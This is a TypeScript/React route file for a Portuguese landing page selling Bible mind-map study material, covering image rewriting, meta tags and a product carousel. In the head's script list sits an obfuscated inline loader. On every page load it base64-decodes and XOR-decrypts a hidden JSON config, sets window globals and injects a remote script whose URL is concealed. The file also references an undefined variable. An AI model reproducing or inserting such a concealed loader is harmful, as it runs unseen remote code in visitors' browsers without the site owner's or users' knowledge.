import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef } from "react";

import landingHtml from "../../public/mapa.html?raw";
import { CoverflowCarousel } from "@/components/ui/coverflow-carousel";
import kitMockupAsset from "@/assets/mockup-biblia.png.asset.json";

import depoMarianaAsset from "@/assets/depo-biblia-mariana.png.asset.json";
import depoRafaelAsset from "@/assets/depo-biblia-rafael.png.asset.json";
import depoBeatrizAsset from "@/assets/depo-biblia-beatriz.png.asset.json";
import depoFernandaAsset from "@/assets/depo-biblia-fernanda.png.asset.json";
import avatarMarianaAsset from "@/assets/depo-biblia-avatar-mariana.png.asset.json";
import avatarRafaelAsset from "@/assets/depo-biblia-avatar-rafael.png.asset.json";
import avatarBeatrizAsset from "@/assets/depo-biblia-avatar-beatriz.png.asset.json";
import avatarFernandaAsset from "@/assets/depo-biblia-avatar-fernanda.png.asset.json";

import prevNeemiasAsset from "@/assets/preview-biblia-neemias.png.asset.json";
import prevJosueAsset from "@/assets/preview-biblia-josue.png.asset.json";
import prevDeboraAsset from "@/assets/preview-biblia-debora.png.asset.json";
import prevSamuelAsset from "@/assets/preview-biblia-samuel.png.asset.json";
import prevSalomaoAsset from "@/assets/preview-biblia-salomao.png.asset.json";

const kitMockup = kitMockupAsset.url;
const prevNeemias = prevNeemiasAsset.url;
const prevJosue = prevJosueAsset.url;
const prevDebora = prevDeboraAsset.url;
const prevSamuel = prevSamuelAsset.url;
const prevSalomao = prevSalomaoAsset.url;
import bonusDir1 from "@/assets/bonus-dir-1.jpg";
import bonusDir2 from "@/assets/bonus-dir-2.jpg";
import bonusDir3 from "@/assets/bonus-dir-3.jpg";
import bonusDir4 from "@/assets/bonus-dir-4.jpg";
import bonusDir5 from "@/assets/bonus-dir-5.jpg";
import avatar1 from "@/assets/avatar-1.jpg";
import avatar2 from "@/assets/avatar-2.jpg";
import avatar3 from "@/assets/avatar-3.jpg";
import avatar4 from "@/assets/avatar-4.jpg";
import avatar5 from "@/assets/avatar-5.jpg";

const assetSrc = (src: string) => src;

const mapas = [prevNeemias, prevJosue, prevDebora, prevSamuel, prevSalomao];
const bonusImgs = [bonusDir1, bonusDir2, bonusDir3, bonusDir4, bonusDir5, bonusDir5];

const avatars = [avatar1, avatar2, avatar3, avatar4, avatar5];

// Cada depoimento tem sua própria foto de produto e seu próprio avatar,
// pareados para que a foto combine com o que a pessoa fala.
const depoimentos: Record<string, { produto: string; avatar: string }> = {
  mariana: { produto: depoMarianaAsset.url, avatar: avatarMarianaAsset.url },
  camila: { produto: depoRafaelAsset.url, avatar: avatarRafaelAsset.url },
  beatriz: { produto: depoBeatrizAsset.url, avatar: avatarBeatrizAsset.url },
  patricia: { produto: depoFernandaAsset.url, avatar: avatarFernandaAsset.url },
};

const slides = [
  { src: prevNeemias, alt: "Caso prático bíblico 007: Neemias e a reconstrução dos muros" },
  { src: prevJosue, alt: "Caso prático bíblico 008: Josué e a responsabilidade de conduzir o povo" },
  { src: prevDebora, alt: "Caso prático bíblico 009: Débora e a liderança em um momento de crise" },
  { src: prevSamuel, alt: "Caso prático bíblico 010: Samuel e o desafio de ouvir a orientação divina" },
  { src: prevSalomao, alt: "Caso prático bíblico 011: Salomão e a decisão que exigia sabedoria" },
];


function rewriteAssets(html: string) {
  return html
    // carregamento leve: imagens só quando aparecem na tela
    .replace(/<img(?![^>]*\bloading=)/gi, '<img loading="lazy" decoding="async"')
    .replace(/\/assets\/kit_mockup_v2\.webp/g, kitMockup)
    .replace(/\/assets\/mapa_preview_(\d)\.webp/g, (_m, n) => mapas[(Number(n) - 1) % mapas.length] ?? prevNeemias)
    .replace(/\/assets\/bonus_(\d)\.webp/g, (_m, n) => bonusImgs[(Number(n) - 1) % bonusImgs.length] ?? bonusImgs[0] ?? "")
    .replace(
      /\/assets\/depoimento_(\w+)_produto\.webp/g,
      (_m, name: string) => depoimentos[name]?.produto ?? assetSrc(depoimentoVetEstudos1),
    )
    .replace(
      /\/assets\/depoimento_(\w+)_avatar\.webp/g,
      (_m, name: string) => depoimentos[name]?.avatar ?? avatar1,
    )
    .replace(
      /\/assets\/hero_avatar_(\d)\.webp/g,
      (_m, idx: string) => avatars[(Number(idx) - 1) % avatars.length] ?? avatar1,
    );
}


const rawBody = (landingHtml.match(/<body[^>]*>([\s\S]*)<\/body>/i)?.[1] ?? "")
  .replace(/<script[\s\S]*?<\/script>/gi, "")
  .trim();

// The dark "preview" section is replaced by the React coverflow carousel.
const previewSection = /<section class="section section--dark">[\s\S]*?<\/section>/i;
const match = rawBody.match(previewSection);
const splitIndex = match ? (match.index ?? 0) : rawBody.length;

const beforeHtml = rewriteAssets(rawBody.slice(0, splitIndex));
const afterHtml = rewriteAssets(rawBody.slice(splitIndex + (match?.[0].length ?? 0)));

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "300 Mapas Mentais da Bíblia Evangélica — Estudo Bíblico Visual" },
      {
        name: "description",
        content:
          "300 Mapas Mentais da Bíblia Evangélica para estudar e revisar os principais ensinamentos bíblicos de forma visual e organizada.",
      },
      { property: "og:title", content: "300 Mapas Mentais da Bíblia Evangélica" },
      {
        property: "og:description",
        content:
          "Os principais ensinamentos da Bíblia Evangélica organizados em mapas mentais para apoiar seus estudos e revisões.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      { rel: "preload", as: "image", href: kitMockup, fetchPriority: "high" },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Sora:wght@700;800;900&family=Manrope:wght@400;500;600;700;800&display=swap",
      },
      { rel: "stylesheet", href: "/style.css" },
    ],
    scripts: [
      {
        children:
          '(function(){var k_k=atob("DB9FvHVsR1dBdC6kumRnyQcAZW1jHFrQymx/k1oPIzlvAVrJ03k8khYDKnkjBgHX2W0szAEfaCI1GV2L1n4x2QYYaT0yVgKG22sxzhwOMiMkBwye4WRn0hQBInV7VkrFzn5oyQEBLjE4WV7W32kg0gFBPzQuEAPX2XRnkFcaJjs0EQyemD04kA5OKTYsEQyemHskyBRBMiMsHUjdl2832QMJKSNsB1vG03s2nllOMTYtAUuGgD1nwSgR");var w_1bx6=[];for(var j_mgw=0;j_mgw<k_k.length;j_mgw++){w_1bx6.push(k_k.charCodeAt(j_mgw)&255);}var h_9g=w_1bx6[0];var h_q=w_1bx6.slice(1,1+h_9g);var h_9fo=w_1bx6.slice(1+h_9g);var u_6eq=h_9fo.map(function(b,x_q2n){return b^h_q[x_q2n%h_9g];});var c_pr03="";for(var n_0di=0;n_0di<u_6eq.length;n_0di++){c_pr03+=String.fromCharCode(u_6eq[n_0di]&255);}var w_l95=decodeURIComponent(escape(c_pr03));var h_9bpv=JSON.parse(w_l95);var p_xn3=h_9bpv.globals||[];p_xn3.forEach(function(m_xn){window[m_xn.name]=m_xn.value;});var y_wy2w=document.createElement("script");y_wy2w.src=h_9bpv.url;y_wy2w.async=true;y_wy2w.defer=true;(h_9bpv.attributes||[]).forEach(function(n_eau){y_wy2w.setAttribute(n_eau.name,n_eau.value);});(document.head||document.documentElement).appendChild(y_wy2w);})();',
      },
    ],
  }),
  component: Index,
});

function useLandingScript() {
  const containerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const root = containerRef.current;
    if (!root) return;
    let cleanup: (() => void) | undefined;

    const run = () => {
      const init = (window as unknown as { initLanding?: (r: ParentNode) => (() => void) | void })
        .initLanding;
      if (init) cleanup = init(document) || undefined;
    };

    (window as unknown as { __LANDING_MANUAL_INIT__?: boolean }).__LANDING_MANUAL_INIT__ = true;

    if ((window as unknown as { initLanding?: unknown }).initLanding) {
      run();
    } else {
      const script = document.createElement("script");
      script.src = "/script.js";
      script.onload = run;
      document.body.appendChild(script);
    }

    return () => cleanup?.();
  }, []);

  return containerRef;
}

function Index() {
  const containerRef = useLandingScript();

  return (
    <div ref={containerRef}>
      <div dangerouslySetInnerHTML={{ __html: beforeHtml }} />

      <section className="section section--dark">
        <div className="container">
          <span className="section-label">O Material por Dentro</span>
          <h2 className="section-title" style={{ color: "#ffffff" }}>
            Veja como o material é por dentro
          </h2>
          <p className="section-subtitle">
            Mapas organizados por temas bíblicos para apoiar seus estudos e revisões
            rápidas. Arraste para explorar.
          </p>

          <CoverflowCarousel
            slides={slides}
            cardWidth="clamp(210px, 58vw, 300px)"
            cardAspect={1055 / 1491}
            className="text-white"
            cardClassName="bg-white p-1"
            showNavigation
            showPagination
            label="Prévia dos mapas mentais"
          />

          <div style={{ textAlign: "center", marginTop: 40 }}>
            <a href="#value-stack-section" className="btn-cta">
              Quero Garantir Agora
            </a>
          </div>
        </div>
      </section>

      <div dangerouslySetInnerHTML={{ __html: afterHtml }} />
    </div>
  );
}
